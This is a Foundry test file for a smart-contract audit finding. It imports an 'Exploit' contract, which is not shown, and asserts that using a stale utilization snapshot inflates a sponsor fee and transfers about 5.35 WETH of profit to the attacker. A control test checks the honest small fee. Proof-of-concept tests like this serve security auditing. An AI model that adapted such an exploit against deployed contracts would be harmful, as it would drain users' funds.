// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, Weth} from "./56661-rush1-8-utilisation-ratio-can-exceed-100-to-inflate-fees-and.sol";

contract Finding56661Test is Test {
    function test_exploit_stale_snapshot_inflates_sponsor_fee() public {
        assertEq(block.timestamp, 1, "timestamp");
        Exploit e = new Exploit();
        uint256 beforeBal = e.weth().balanceOf(address(this));
        e.run();
        assertEq(e.utilization(), 10 ** 31, "utilization");
        assertEq(e.sponsorPaid(), 5_945_585_996_749_963_533, "sponsor paid");
        assertEq(e.attackerProfit(), 5_351_027_397_074_967_174, "lp profit");
        assertEq(e.weth().balanceOf(address(this)) - beforeBal, 5_351_027_397_074_967_174, "received");
        assertEq(e.router().sponsorBalance(), 10 ether - 5_945_585_996_749_963_533, "sponsor left");
    }

    function test_control_fresh_snapshot_charges_the_small_fee() public {
        assertEq(block.timestamp, 1, "timestamp");
        Exploit e = new Exploit();
        uint256 beforeBal = e.weth().balanceOf(address(this));
        e.runHonest();
        assertLe(e.utilization(), 1e18, "utilization within 100%");
        assertEq(e.sponsorPaid(), 317_097, "honest fee");
        assertEq(e.attackerProfit(), 285_387, "honest lp share");
        assertEq(e.weth().balanceOf(address(this)) - beforeBal, 285_387, "received");
        assertLt(e.attackerProfit(), 0.001 ether, "no inflated extraction");
    }
}
